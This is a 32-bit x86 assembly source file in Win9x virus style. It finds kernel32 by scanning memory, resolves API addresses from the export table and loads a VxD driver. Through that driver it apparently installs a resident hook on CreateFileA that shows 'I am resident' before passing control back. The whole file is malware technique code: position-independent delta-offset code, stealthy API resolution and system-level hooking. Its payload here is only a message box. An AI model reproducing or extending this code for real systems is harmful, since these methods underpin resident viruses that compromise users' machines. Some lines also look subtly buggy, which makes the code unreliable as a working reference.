.386
.model flat

FILE_FLAG_DELETE_ON_CLOSE       EQU 04000000h
RESIDENT_SIZE                   EQU offset resident_end - offset resident_start

.data

db 0

.code

start:

call delta_offset

delta_offset:

pop ebp
sub ebp,offset delta_offset

mov dword ptr [ebp+residentsize],RESIDENT_SIZE
lea eax,[ebp+offset resident_start]
mov dword ptr [ebp+residentoffset],eax

call locate_kernel                      ;copies kernel address to eax
mov dword ptr [ebp+kerneloffset],eax

call get_export_table                   ;kerneloffset in eax

call get_all_apis

call loadvxd
mov eax,dword ptr [ebp+residentaddress]

return_host:

push 0
call [ebp+ExitProcess]

;---------------------------------the resident part starts here-------------------

resident_start:

pushf
push ebx
push ecx
push edx
push esi
push edi
push ebp

call resident_delta_offset

resident_delta_offset:
pop ebp
sub ebp,offset resident_delta_offset

lea eax,[ebp+offset dllimport1]
push eax
call [ebp+LoadLibrary]
mov dword ptr [ebp+dllimportoffset1],eax

lea eax,[ebp+offset MessageBox_]
push eax
push dword ptr [ebp+dllimportoffset1]
call [ebp+GetProcAddress]
mov dword ptr [ebp+MessageBox],eax

push 0
lea eax,[ebp+offset resident_title]
push eax
lea eax,[ebp+offset resident_text]
push eax
push 0
call [ebp+MessageBox]

mov eax,ebp

pop ebp
pop edi
pop esi
pop edx
pop ecx
pop ebx
popf

jmp dword ptr [eax+jump_back] 

resident_title          db "System Message",0
resident_text           db "I am resident",0
LoadLibrary             dd 0
LoadLibrary_            db "LoadLibraryA",0
GetProcAddress          dd 0
GetProcAddress_         db "GetProcAddress",0

dllimport1              db "user32.dll",0
dllimportoffset1        dd 0
MessageBox              dd 0
MessageBox_             db "MessageBoxA",0

jump_back               dd 0

resident_end:

;------------------------------------variables--------------------------

Api_Adress_Table    dd 0
Api_Name_Table      dd 0
Api_Ordinary_Table  dd 0

inputbuffer:         
residentoffset      dd 0
residentsize        dd 0
name_table_entry    dd 0
kerneloffset        dd 0


outputbuffer:
residentaddress     dd 0

Current_API_Lenght  dd 0
CloseHandle         dd 0
CloseHandle_        db "CloseHandle",0
ExitProcess         dd 0
ExitProcess_        db "ExitProcess",0
DeviceIoControl     dd 0
DeviceIoControl_    db "DeviceIoControl",0
CreateFile          dd 0
CreateFile_         db "CreateFileA",0


;------------------------------------procedures-------------------------

locate_kernel proc
mov dword ptr [ebp+stack_buffer],ebx

pop ebx
pop eax
push eax
push ebx
mov ax,0000h

is_this_mz:

cmp word ptr [eax],'ZM'
je found_mz
sub eax,10000h
jmp is_this_mz

found_mz:

mov ebx,dword ptr [ebp+stack_buffer]
ret

stack_buffer dd 0

endp


get_export_table proc
pushad

mov ebx,dword ptr [eax+3ch]
add eax,ebx
cmp word ptr [eax],'EP'
jne prepare_for_jumping_back

mov esi,dword ptr [eax+78h] ;go to exporttable
add esi,dword ptr [ebp+kerneloffset]

add esi,1ch
mov eax,dword ptr [esi]
add eax,dword ptr [ebp+kerneloffset] ;Offset of RVA of the function_names_table
mov [ebp+dword ptr Api_Adress_Table],eax

add esi,4
mov eax,dword ptr [esi]
add eax,dword ptr [ebp+kerneloffset] ;Offset of RVA of the function_names_table
mov [ebp+dword ptr Api_Name_Table],eax

add esi,4
mov eax,dword ptr [esi]
add eax,dword ptr [ebp+kerneloffset] ;Offset of RVA of the function_names_table
mov [ebp+dword ptr Api_Ordinary_Table],eax

popad
ret

prepare_for_jumping_back:

popad
pop eax
jmp return_host

endp

get_kernel_api  proc
pushad

push eax
add eax,4
call get_string_lenght
mov dword ptr [ebp+Current_API_Lenght],eax
pop eax
mov ebx,dword ptr [ebp+Api_Name_Table]
mov edx,0

string_find_loop:
mov ecx,dword ptr [ebp+Current_API_Lenght]
lea esi,[eax+4]
mov edi,dword ptr [ebx]
add edi,dword ptr [ebp+kerneloffset]
rep cmpsb
je found_API_string
add edx,1
add ebx,4
jmp string_find_loop

found_API_string:

shl edx,1
add edx,dword ptr [ebp+Api_Ordinary_Table]
mov ebx,0
mov bx,word ptr [edx]

shl bx,2
add ebx,dword ptr [ebp+Api_Adress_Table]
mov edx,dword ptr [ebx]
mov dword ptr [ebp+save_it],ebx
add edx,dword ptr [ebp+kerneloffset]
mov dword ptr [eax],edx

popad
mov eax,dword ptr [ebp+save_it]

ret

save_it dd 0

endp

get_string_lenght proc    ;offset of string in eax

push ecx
mov ecx,0

find_the_end_again:

cmp byte ptr [eax],00h
je found_lenght
inc ecx
inc eax
jmp find_the_end_again

found_lenght:

mov eax,ecx
pop ecx

ret

endp

loadvxd proc

pushad

push 0
push FILE_FLAG_DELETE_ON_CLOSE
push 0
push 0
push 0
push 0
lea eax,[ebp+offset VxDName]
push eax
call [ebp+CreateFile]
mov dword ptr [ebp+vxdhandle],eax

push 0
push 0
push 4
lea ebx,[ebp+offset outputbuffer]
push ebx
push 12
lea ebx,[ebp+offset inputbuffer]
push ebx
push 1
push eax
call [ebp+DeviceIoControl]

push dword ptr [ebp+vxdhandle]
call CloseHandle

popad

ret

vxdhandle       dd 0
VxDName         db "\\.\dynavxd.vxd",0

endp

get_all_apis proc
pushad

lea eax,[ebp+offset LoadLibrary] 
call get_kernel_api                     ;find an API in kernel

lea eax,[ebp+offset GetProcAddress]
call get_kernel_api

lea eax,[ebp+offset DeviceIoControl]
call get_kernel_api

lea eax,[ebp+offset CreateFile]
call get_kernel_api
mov dword ptr [ebp+name_table_entry],eax
mov eax,dword ptr [ebp+CreateFile]
mov dword ptr [ebp+jump_back],eax

lea eax,[ebp+offset CloseHandle]
call get_kernel_api

lea eax,[ebp+offset ExitProcess]
call get_kernel_api

popad
ret

endp


end start
